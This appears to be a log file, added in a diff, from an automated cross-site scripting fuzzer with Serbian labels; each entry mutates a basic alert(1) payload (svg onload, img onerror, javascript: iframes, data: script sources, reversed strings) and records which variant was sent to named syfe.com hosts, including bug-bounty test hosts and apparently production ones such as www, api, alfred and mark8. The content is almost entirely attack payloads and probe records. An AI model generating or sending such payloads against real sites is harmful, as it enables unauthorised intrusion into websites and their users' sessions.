@@ -1,0 +1,1140 @@
+
+--- 2025-05-23 00:02:02.414001 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <svg/onload=alert(1)>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <svg/onload=window.alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+[https://uat-bugbounty.nonprod.syfe.com] <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+
+--- 2025-05-23 00:02:16.100344 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <img src=x onerror=window.alert(1)>
+[https://uat-bugbounty.nonprod.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 00:02:31.730069 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:window.alert(1)'></iframe>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+[https://uat-bugbounty.nonprod.syfe.com] <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+
+--- 2025-05-23 00:02:45.319015 ---
+Original: <script>alert(1)</script>
+Stilizovano: <svg/onload=alert(1)
+Stilizovano: >tpircs/<)1(trela>tpircs<
+Stilizovano: <body onload=<script>alert(1)</script>>
+Stilizovano: <script>window.alert(1)</script>
+Stilizovano: <iframe src='javascript:<script>alert(1)</script>'></iframe>
+Stilizovano: <script src='data:text/javascript,<script>alert(1)</script>'></script>
+Stilizovano: <img src='x' onerror='<script>alert(1)</script>'>
+[https://api-uat-bugbounty.nonprod.syfe.com] <svg/onload=alert(1)
+
+--- 2025-05-23 00:03:01.862129 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <svg/onload=window.alert(1)>
+Stilizovano: <svg/onload=alert(1)>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+[https://api-uat-bugbounty.nonprod.syfe.com] <img src='x' onerror='<svg/onload=alert(1)>'>
+
+--- 2025-05-23 00:03:14.514082 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <iframe src='javascript:window.alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:alert(1)'></iframe>
+[https://api-uat-bugbounty.nonprod.syfe.com] <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+
+--- 2025-05-23 00:03:24.441210 ---
+Original: <script>alert(1)</script>
+Stilizovano: >tpircs/<)1(trela>tpircs<
+Stilizovano: <iframe src='javascript:<script>alert(1)</script>'></iframe>
+Stilizovano: <script src='data:text/javascript,<script>alert(1)</script>'></script>
+Stilizovano: <script>window.alert(1)</script>
+Stilizovano: <img src='x' onerror='<script>alert(1)</script>'>
+Stilizovano: <svg/onload=alert(1)
+Stilizovano: <body onload=<script>alert(1)</script>>
+[https://www.syfe.com] >tpircs/<)1(trela>tpircs<
+
+--- 2025-05-23 00:03:42.239050 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <svg/onload=alert(1)>
+Stilizovano: <svg/onload=window.alert(1)>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: >)1(trela=daolno/gvs<
+[https://www.syfe.com] <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+
+--- 2025-05-23 00:03:58.494189 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src=x onerror=alert(1)>
+Stilizovano: <img src=x onerror=window.alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+[https://www.syfe.com] <img src=x onerror=alert(1)>
+
+--- 2025-05-23 00:04:10.373283 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:window.alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://www.syfe.com] >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+
+--- 2025-05-23 00:04:27.088353 ---
+Original: <script>alert(1)</script>
+Stilizovano: <body onload=<script>alert(1)</script>>
+Stilizovano: <script>window.alert(1)</script>
+Stilizovano: <svg/onload=alert(1)
+Stilizovano: >tpircs/<)1(trela>tpircs<
+Stilizovano: <iframe src='javascript:<script>alert(1)</script>'></iframe>
+Stilizovano: <script src='data:text/javascript,<script>alert(1)</script>'></script>
+Stilizovano: <img src='x' onerror='<script>alert(1)</script>'>
+[https://api.syfe.com] <body onload=<script>alert(1)</script>>
+
+--- 2025-05-23 00:04:38.882715 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <svg/onload=alert(1)>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <svg/onload=window.alert(1)>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+[https://api.syfe.com] <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+
+--- 2025-05-23 00:04:51.363670 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src=x onerror=window.alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+[https://api.syfe.com] <img src=x onerror=window.alert(1)>
+
+--- 2025-05-23 00:05:03.852214 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:window.alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+[https://api.syfe.com] <body onload=<iframe src='javascript:alert(1)'></iframe>>
+
+--- 2025-05-23 00:05:14.281709 ---
+Original: <script>alert(1)</script>
+Stilizovano: <img src='x' onerror='<script>alert(1)</script>'>
+Stilizovano: <script>window.alert(1)</script>
+Stilizovano: >tpircs/<)1(trela>tpircs<
+Stilizovano: <svg/onload=alert(1)
+Stilizovano: <script src='data:text/javascript,<script>alert(1)</script>'></script>
+Stilizovano: <body onload=<script>alert(1)</script>>
+Stilizovano: <iframe src='javascript:<script>alert(1)</script>'></iframe>
+[https://alfred.syfe.com] <img src='x' onerror='<script>alert(1)</script>'>
+
+--- 2025-05-23 00:05:23.775502 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: <img src=x onerror=window.alert(1)>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+[https://alfred.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 00:05:35.480522 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:window.alert(1)'></iframe>
+[https://alfred.syfe.com] >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+
+--- 2025-05-23 00:05:45.348131 ---
+Original: <script>alert(1)</script>
+Stilizovano: <img src='x' onerror='<script>alert(1)</script>'>
+Stilizovano: <body onload=<script>alert(1)</script>>
+Stilizovano: <script src='data:text/javascript,<script>alert(1)</script>'></script>
+Stilizovano: <script>window.alert(1)</script>
+Stilizovano: >tpircs/<)1(trela>tpircs<
+Stilizovano: <iframe src='javascript:<script>alert(1)</script>'></iframe>
+Stilizovano: <svg/onload=alert(1)
+[https://mark8.syfe.com] <img src='x' onerror='<script>alert(1)</script>'>
+
+--- 2025-05-23 00:05:59.811040 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <svg/onload=window.alert(1)>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=alert(1)>
+[https://mark8.syfe.com] <body onload=<svg/onload=alert(1)>>
+
+--- 2025-05-23 00:06:15.686889 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <img src=x onerror=window.alert(1)>
+Stilizovano: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+[https://mark8.syfe.com] <body onload=<img src=x onerror=alert(1)>>
+
+--- 2025-05-23 00:06:31.452244 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <iframe src='javascript:window.alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+[https://mark8.syfe.com] <iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 00:35:48 ---
+Original: <script>alert(1)</script>
+Stilizovano: <iframe src='javascript:<script>alert(1)</script>'></iframe>
+Stilizovano: <script src='data:text/javascript,<script>alert(1)</script>'></script>
+Stilizovano: <img src='x' onerror='<script>alert(1)</script>'>
+Stilizovano: <body onload=<script>alert(1)</script>>
+Stilizovano: >tpircs/<)1(trela>tpircs<
+Stilizovano: <svg/onload=script>alert(1)</script>
+
+--- 2025-05-23 06:21:11 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://uat-bugbounty.nonprod.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:21:28 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+[https://uat-bugbounty.nonprod.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:21:41 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+[https://uat-bugbounty.nonprod.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 06:21:55 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://api-uat-bugbounty.nonprod.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:22:08 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+[https://api-uat-bugbounty.nonprod.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:22:19 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+[https://api-uat-bugbounty.nonprod.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 06:22:31 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://www.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:22:46 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+[https://www.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:23:02 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+[https://www.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 06:23:17 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://api.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:23:31 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+[https://api.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:23:44 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+[https://api.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 06:24:00 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://alfred.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:24:14 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+[https://alfred.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:24:26 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+[https://alfred.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 06:24:36 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://mark8.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:24:52 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+[https://mark8.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:25:05 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+[https://mark8.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 06:31:11 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://uat-bugbounty.nonprod.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:31:29 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://uat-bugbounty.nonprod.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:31:44 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+[https://uat-bugbounty.nonprod.syfe.com] <body onload=<iframe src='javascript:alert(1)'></iframe>>
+
+--- 2025-05-23 06:31:53 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://api-uat-bugbounty.nonprod.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:32:09 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://api-uat-bugbounty.nonprod.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:32:24 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+[https://api-uat-bugbounty.nonprod.syfe.com] <body onload=<iframe src='javascript:alert(1)'></iframe>>
+
+--- 2025-05-23 06:32:38 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://www.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:32:56 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://www.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:33:12 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+[https://www.syfe.com] <body onload=<iframe src='javascript:alert(1)'></iframe>>
+
+--- 2025-05-23 06:33:21 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
